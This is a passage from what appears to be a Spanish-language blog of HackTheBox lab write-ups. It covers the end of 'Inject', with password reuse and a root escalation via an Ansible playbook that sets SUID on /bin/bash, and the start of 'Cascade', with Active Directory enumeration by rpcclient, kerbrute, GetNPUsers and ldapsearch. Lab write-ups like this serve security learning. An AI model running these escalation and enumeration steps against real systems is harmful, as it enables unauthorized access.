  <li>Si recordamos tenemos la contraseña de <strong>phil</strong> de primeras no pudimos conectarnos por <code class="language-plaintext highlighter-rouge">ssh</code> pero si podemos migrar a ese usuario desde la <code class="language-plaintext highlighter-rouge">shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>frank@inject:~/.m2<span class="nv">$ </span><span class="nb">cat </span>settings.xml
&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span>?&gt;
&lt;settings <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://maven.apache.org/POM/4.0.0"</span> xmlns:xsi<span class="o">=</span><span class="s2">"http://www.w3.org/2001/XMLSchema-instance"</span>
        xsi:schemaLocation<span class="o">=</span><span class="s2">"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"</span><span class="o">&gt;</span>
  &lt;servers&gt;
    &lt;server&gt;
      &lt;<span class="nb">id</span><span class="o">&gt;</span>Inject&lt;/id&gt;
      &lt;username&gt;phil&lt;/username&gt;
      &lt;password&gt;DocPhillovestoInject123&lt;/password&gt;
      &lt;privateKey&gt;<span class="k">${</span><span class="nv">user</span><span class="p">.home</span><span class="k">}</span>/.ssh/id_dsa&lt;/privateKey&gt;
      &lt;filePermissions&gt;660&lt;/filePermissions&gt;
      &lt;directoryPermissions&gt;660&lt;/directoryPermissions&gt;
      &lt;configuration&gt;&lt;/configuration&gt;
    &lt;/server&gt;
  &lt;/servers&gt;
&lt;/settings&gt;
frank@inject:~/.m2<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Funciona.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>frank@inject:~/.m2<span class="nv">$ </span>su phil
Password:
phil@inject:/home/frank/.m2<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>phil<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>phil<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>phil<span class="o">)</span>,50<span class="o">(</span>staff<span class="o">)</span>
phil@inject:/home/frank/.m2<span class="err">$</span>
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<ul>
  <li>Podemos ver la flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>phil@inject:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
8dc5c8c4c03735847448fbf460738832
phil@inject:~<span class="err">$</span>
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>

<ul>
  <li>Al no encontrar nada interesante decidí ejecutar <code class="language-plaintext highlighter-rouge">pspy64</code> para ver tareas <code class="language-plaintext highlighter-rouge">cron</code> y encontré esta, corre <code class="language-plaintext highlighter-rouge">ansible-parallel</code> <a href="https://pypi.org/project/ansible-parallel/">https://pypi.org/project/ansible-parallel/</a>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/inject/escalada.png" />
</p>

<ul>
  <li>Allí vemos la estructura del <code class="language-plaintext highlighter-rouge">.yml</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>phil@inject:/opt/automation<span class="nv">$ </span><span class="nb">cd </span>tasks/
phil@inject:/opt/automation/tasks<span class="nv">$ </span><span class="nb">ls
</span>playbook_1.yml
phil@inject:/opt/automation/tasks<span class="nv">$ </span><span class="nb">cat </span>playbook_1.yml
- hosts: localhost
  tasks:
  - name: Checking webapp service
    ansible.builtin.systemd:
      name: webapp
      enabled: <span class="nb">yes
      </span>state: started
phil@inject:/opt/automation/tasks<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Vemos que el directorio <code class="language-plaintext highlighter-rouge">tasks</code> corresponde al grupo staff y nosotros estamos allí y podemos escribir.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>phil@inject:/opt/automation/tasks<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>phil<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>phil<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>phil<span class="o">)</span>,50<span class="o">(</span>staff<span class="o">)</span>
phil@inject:/opt/automation/tasks<span class="nv">$ </span><span class="nb">cd</span> ..
phil@inject:/opt/automation<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
total 4
drwxrwxr-x 2 root staff 4096 Jun  2 19:26 tasks
</code></pre></div></div>

<ul>
  <li>Como es una tarea cron lo que vamos hacer es asignarle privilegios <code class="language-plaintext highlighter-rouge">SUID</code> ala <code class="language-plaintext highlighter-rouge">bash</code> usando el modulo <code class="language-plaintext highlighter-rouge">ansible.builtin.shell</code> <a href="https://docs.ansible.com/ansible/latest/collections/ansible/builtin/shell_module.html">https://docs.ansible.com/ansible/latest/collections/ansible/builtin/shell_module.html</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>phil@inject:/opt/automation/tasks<span class="nv">$ </span><span class="nb">cat </span>playbook_2.yml
- hosts: localhost
  tasks:
    - name: SUID
      ansible.builtin.shell: |
        <span class="nb">chmod</span> +s /bin/bash
      become: <span class="nb">true
</span>phil@inject:/opt/automation/tasks<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Vamos a esperar a que se ejecute la tarea y ver si las <code class="language-plaintext highlighter-rouge">bash</code> se le otorga el privilegio <code class="language-plaintext highlighter-rouge">SUID</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>phil@inject:/opt/automation/tasks<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /bin/bash
<span class="nt">-rwsr-sr-x</span> 1 root root 1183448 Apr 18  2022 /bin/bash
phil@inject:/opt/automation/tasks<span class="err">$</span>
</code></pre></div></div>

<h2 id="shell-as-root">Shell as root</h2>

<ul>
  <li>Ahora ya estamos como <code class="language-plaintext highlighter-rouge">root</code> y vemos la <code class="language-plaintext highlighter-rouge">flag</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>phil@inject:/opt/automation/tasks<span class="nv">$ </span>bash <span class="nt">-p</span>
bash-5.0# <span class="nb">whoami
</span>root
bash-5.0# <span class="nb">cat</span> /root/root.txt
5a756880b37d955eee4996c9ef8a0620
bash-5.0#
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/easy" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Cascade (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/06/01/cascade.html" rel="alternate" type="text/html" title="HackTheBox - Cascade (medium)" /><published>2024-06-01T00:00:00-06:00</published><updated>2024-06-01T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/06/01/cascade</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/06/01/cascade.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/64fef851357b8de1c4834093bf3426f2.png" />
</p>

<ul>
  <li>Cascade is a medium difficulty Windows machine configured as a Domain Controller. LDAP anonymous binds are enabled, and enumeration yields the password for user <code class="language-plaintext highlighter-rouge">r.thompson</code>, which gives access to a <code class="language-plaintext highlighter-rouge">TightVNC</code> registry backup. The backup is decrypted to gain the password for <code class="language-plaintext highlighter-rouge">s.smith</code>. This user has access to a .NET executable, which after decompilation and source code analysis reveals the password for the <code class="language-plaintext highlighter-rouge">ArkSvc</code> account. This account belongs to the <code class="language-plaintext highlighter-rouge">AD Recycle Bin</code> group, and is able to view deleted Active Directory objects. One of the deleted user accounts is found to contain a hardcoded password, which can be reused to login as the primary domain administrator.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Comenzamos enumerando los puertos y servicios abiertos por el protocoló <strong>TCP</strong> de la máquina victima.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,88,135,139,389,445,636,3268,3269,5985,49154,49155,49157,49158,49170 10.10.10.182 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-05-30 10:48 CST
Nmap scan report <span class="k">for </span>10.10.10.182
Host is up <span class="o">(</span>0.091s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 <span class="o">(</span>1DB15D39<span class="o">)</span> <span class="o">(</span>Windows Server 2008 R2 SP1<span class="o">)</span>
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 <span class="o">(</span>1DB15D39<span class="o">)</span>
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-05-30 16:48:29Z<span class="o">)</span>
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: cascade.local, Site: Default-First-Site-Name<span class="o">)</span>
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: cascade.local, Site: Default-First-Site-Name<span class="o">)</span>
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49170/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   <span class="nb">date</span>: 2024-05-30T16:49:21
|_  start_date: 2024-05-30T16:45:09
|_clock-skew: <span class="nt">-4s</span>
| smb2-security-mode:
|   2:1:0:
|_    Message signing enabled and required
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Vamos agregar el nombre del dominio al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap cme ldap 10.10.10.182
SMB         10.10.10.182    445    CASC-DC1         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:CASC-DC1<span class="o">)</span> <span class="o">(</span>domain:cascade.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="s2">"10.10.10.182 cascade.local dc.cascade.local"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.10.10.182 cascade.local dc.cascade.local
</code></pre></div></div>

<ul>
  <li>No podemos enumerar por el protocolo <code class="language-plaintext highlighter-rouge">smb</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap cme smb 10.10.10.182 <span class="nt">--shares</span>
SMB         10.10.10.182    445    CASC-DC1         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:CASC-DC1<span class="o">)</span> <span class="o">(</span>domain:cascade.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.182    445    CASC-DC1         <span class="o">[</span>-] Error enumerating shares: STATUS_USER_SESSION_DELETED
➜  nmap cme smb 10.10.10.182 <span class="nt">-u</span> <span class="s2">"miguelito"</span> <span class="nt">-p</span> <span class="s2">""</span> <span class="nt">--shares</span>
SMB         10.10.10.182    445    CASC-DC1         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:CASC-DC1<span class="o">)</span> <span class="o">(</span>domain:cascade.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.182    445    CASC-DC1         <span class="o">[</span>-] cascade.local<span class="se">\m</span>iguelito: STATUS_LOGON_FAILURE
➜  nmap smbclient <span class="nt">-N</span> <span class="nt">-L</span> //10.10.10.182
Anonymous login successful

	Sharename       Type      Comment
	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
Reconnecting with SMB1 <span class="k">for </span>workgroup listing.
do_connect: Connection to 10.10.10.182 failed <span class="o">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span class="o">)</span>
Unable to connect with SMB1 <span class="nt">--</span> no workgroup available
</code></pre></div></div>

<ul>
  <li>Podemos enumerar usuarios con la herramienta <code class="language-plaintext highlighter-rouge">rpcclient</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s2">""</span> 10.10.10.182
rpcclient <span class="nv">$&gt;</span> enumdomusers
user:[CascGuest] rid:[0x1f5]
user:[arksvc] rid:[0x452]
user:[s.smith] rid:[0x453]
user:[r.thompson] rid:[0x455]
user:[util] rid:[0x457]
user:[j.wakefield] rid:[0x45c]
user:[s.hickson] rid:[0x461]
user:[j.goodhand] rid:[0x462]
user:[a.turnbull] rid:[0x464]
user:[e.crowe] rid:[0x467]
user:[b.hanson] rid:[0x468]
user:[d.burman] rid:[0x469]
user:[BackupSvc] rid:[0x46a]
user:[j.allen] rid:[0x46e]
user:[i.croft] rid:[0x46f]
rpcclient <span class="nv">$&gt;</span>
</code></pre></div></div>

<ul>
  <li>Vamos agregar a los usuarios una lista.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s2">""</span> 10.10.10.182 <span class="nt">-c</span> enumdomusers | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s2">"</span><span class="se">\[</span><span class="s2">.*?</span><span class="se">\]</span><span class="s2">"</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"0x"</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'[]'</span> <span class="o">&gt;</span> users.txt
➜  nmap <span class="nb">cat </span>users.txt
CascGuest
arksvc
s.smith
r.thompson
util
j.wakefield
s.hickson
j.goodhand
a.turnbull
e.crowe
b.hanson
d.burman
BackupSvc
j.allen
i.croft
</code></pre></div></div>

<ul>
  <li>Vamos a verificar que los usuarios sean correctos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap /opt/kerbrute_linux_amd64 userenum <span class="nt">-d</span> cascade.local <span class="nt">--dc</span> cascade.local users.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/

Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 05/30/24 - Ronnie Flathers @ropnop

2024/05/30 10:58:12 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
2024/05/30 10:58:12 <span class="o">&gt;</span>  	cascade.local:88

2024/05/30 10:58:17 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 s.hickson@cascade.local
2024/05/30 10:58:17 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 j.goodhand@cascade.local
2024/05/30 10:58:17 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 j.wakefield@cascade.local
2024/05/30 10:58:17 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 s.smith@cascade.local
2024/05/30 10:58:17 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 a.turnbull@cascade.local
2024/05/30 10:58:17 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 r.thompson@cascade.local
2024/05/30 10:58:20 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 util@cascade.local
2024/05/30 10:58:20 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 arksvc@cascade.local
2024/05/30 10:58:22 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 d.burman@cascade.local
2024/05/30 10:58:22 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 j.allen@cascade.local
2024/05/30 10:58:22 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 BackupSvc@cascade.local
2024/05/30 10:58:22 <span class="o">&gt;</span>  Done! Tested 15 usernames <span class="o">(</span>11 valid<span class="o">)</span> <span class="k">in </span>10.383 seconds
</code></pre></div></div>

<ul>
  <li>Vamos a tratar de obtener un <code class="language-plaintext highlighter-rouge">TGT</code> sin uso de una contraseña por que no disponemos de ninguna pero si probamos con este ataque no tenemos suerte.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap impacket-GetNPUsers <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> users.txt cascade.local/
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span>-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED<span class="o">(</span>Clients credentials have been revoked<span class="o">)</span>
<span class="o">[</span>-] User arksvc doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User s.smith doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User r.thompson doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User util doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User j.wakefield doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User s.hickson doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User j.goodhand doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User a.turnbull doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED<span class="o">(</span>Clients credentials have been revoked<span class="o">)</span>
<span class="o">[</span>-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED<span class="o">(</span>Clients credentials have been revoked<span class="o">)</span>
<span class="o">[</span>-] User d.burman doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User BackupSvc doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User j.allen doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
</span></code></pre></div></div>

<ul>
  <li>
    <p>Tenemos el puerto <code class="language-plaintext highlighter-rouge">ldap</code> abierto así que también podemos enumerar por ese protocolo <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap">https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap</a>.</p>
  </li>
  <li>
    <p>Vamos a usar <code class="language-plaintext highlighter-rouge">ldapsearch</code> para enumerar este servicio algo que podemos hacer es ver los usuarios si es que no nos pide credenciales.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap ldapsearch <span class="nt">-x</span> <span class="nt">-H</span> ldap://10.10.10.182 <span class="nt">-b</span> <span class="s2">"dc=cascade,dc=local"</span> | <span class="nb">grep</span> <span class="s1">'userPrincipalName'</span> | <span class="nb">tr</span> <span class="s1">'@'</span> <span class="s1">' '</span> | <span class="nb">awk</span> <span class="s1">'{print $2}'</span>
CascGuest
arksvc
s.smith
r.thompson
util
j.wakefield
s.hickson
j.goodhand
a.turnbull
e.crowe
b.hanson
d.burman
BackupSvc
j.allen
i.croft
</code></pre></div></div>

<ul>
  <li>Pero bueno como ya hicimos pruebas con los usuarios de solicitar un <code class="language-plaintext highlighter-rouge">TGT</code> vamos mejor seguir enumerando filtrando por el <code class="language-plaintext highlighter-rouge">Distinguished Name</code> y aquellas líneas que contienen la palabra <code class="language-plaintext highlighter-rouge">users</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap ldapsearch <span class="nt">-x</span> <span class="nt">-H</span> ldap://10.10.10.182 <span class="nt">-b</span> <span class="s2">"dc=cascade,dc=local"</span> | <span class="nb">grep</span> <span class="s1">'dn'</span> | <span class="nb">grep</span> <span class="nt">-i</span> <span class="s1">'users'</span>
dn: <span class="nv">CN</span><span class="o">=</span>Users,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Administrator,CN<span class="o">=</span>Users,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>CascGuest,CN<span class="o">=</span>Users,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Users,CN<span class="o">=</span>Builtin,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Remote Desktop Users,CN<span class="o">=</span>Builtin,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Performance Monitor Users,CN<span class="o">=</span>Builtin,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Performance Log Users,CN<span class="o">=</span>Builtin,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Distributed COM Users,CN<span class="o">=</span>Builtin,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>krbtgt,CN<span class="o">=</span>Users,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Domain Computers,CN<span class="o">=</span>Users,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Domain Controllers,CN<span class="o">=</span>Users,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Schema Admins,CN<span class="o">=</span>Users,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Enterprise Admins,CN<span class="o">=</span>Users,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Cert Publishers,CN<span class="o">=</span>Users,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Domain Admins,CN<span class="o">=</span>Users,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Domain Users,CN<span class="o">=</span>Users,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Domain Guests,CN<span class="o">=</span>Users,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Group Policy Creator Owners,CN<span class="o">=</span>Users,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>RAS and IAS Servers,CN<span class="o">=</span>Users,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Allowed RODC Password Replication Group,CN<span class="o">=</span>Users,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Denied RODC Password Replication Group,CN<span class="o">=</span>Users,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Read-only Domain Controllers,CN<span class="o">=</span>Users,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Enterprise Read-only Domain Controllers,CN<span class="o">=</span>Users,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>DnsAdmins,CN<span class="o">=</span>Users,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>DnsUpdateProxy,CN<span class="o">=</span>Users,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">OU</span><span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>ArkSvc,OU<span class="o">=</span>Services,OU<span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Steve Smith,OU<span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Ryan Thompson,OU<span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Util,OU<span class="o">=</span>Services,OU<span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>James Wakefield,OU<span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Stephanie Hickson,OU<span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>John Goodhand,OU<span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Adrian Turnbull,OU<span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>WinRMRemoteWMIUsers__,CN<span class="o">=</span>Users,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Remote Management Users,OU<span class="o">=</span>Groups,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Edward Crowe,OU<span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Ben Hanson,OU<span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>David Burman,OU<span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">OU</span><span class="o">=</span>Services,OU<span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>BackupSvc,OU<span class="o">=</span>Services,OU<span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Joseph Allen,OU<span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dn: <span class="nv">CN</span><span class="o">=</span>Ian Croft,OU<span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local</span>
</code></pre></div></div>

<ul>
  <li>Vemos usuarios importantes.</li>
</ul>

